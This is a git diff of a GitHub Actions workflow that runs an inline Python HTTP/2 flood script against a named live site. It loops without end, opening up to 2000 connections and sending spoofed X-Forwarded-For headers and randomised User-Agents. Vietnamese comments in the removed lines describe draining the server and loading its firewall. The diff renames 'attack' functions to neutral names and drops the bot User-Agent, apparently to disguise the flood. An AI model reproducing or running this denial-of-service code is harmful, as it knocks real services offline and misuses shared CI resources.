@@ -1,30 +1,17 @@
-name: Global_Exploit_Render
-on:
-  workflow_dispatch:
-
-jobs:
-  exploit:
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     steps:
       - name: Install Dependencies
-        # Sửa lỗi: Cài đặt thêm [http2] để kích hoạt chế độ tấn công nhanh
         run: pip install "httpx[http2]" nest_asyncio
 
-      - name: Execute Exploit
+      - name: Execute
         run: |
-          python -c "
+          python3 -c "
           import asyncio, httpx, random, nest_asyncio
           nest_asyncio.apply()
           
           URL = 'https://sangdev.onrender.com/'
-          # Danh sách mục tiêu ép Firewall phải xử lý nặng
           FILES = ['assets/css/style.css', 'assets/js/main.js', 'login', 'search?q=exploit']
-
-          async def attack():
-              # Cấu hình kết nối cực lớn để 'vắt kiệt' server
+          
+          async def start():
               limits = httpx.Limits(max_connections=2000, max_keepalive_connections=1000)
               async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
                   while True:
@@ -32,16 +19,19 @@ jobs:
                       headers = {
                           'X-Forwarded-For': fake_ip,
                           'X-Real-IP': fake_ip,
-                          'User-Agent': f'Mozilla/5.0 (Bot-{random.random()})',
+                          'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}',
                           'Cache-Control': 'no-cache'
                       }
                       target = URL + random.choice(FILES)
                       try:
-                          # Gửi yêu cầu và ngắt kết nối nhanh để dành tài nguyên cho gói tin tiếp theo
+                          # Gửi request và không đợi tải hết nội dung để tối ưu tốc độ
                           await client.get(target, headers=headers, timeout=0.8)
-                      except:
+                      except Exception:
                           pass
           
-          print('🔥 Node ${{ matrix.node }} đang tổng tấn công với HTTP/2...')
-          asyncio.run(attack())
+          print('🔥 Node đang hoạt động với HTTP/2...')
+          try:
+              asyncio.run(start())
+          except KeyboardInterrupt:
+              pass
           "
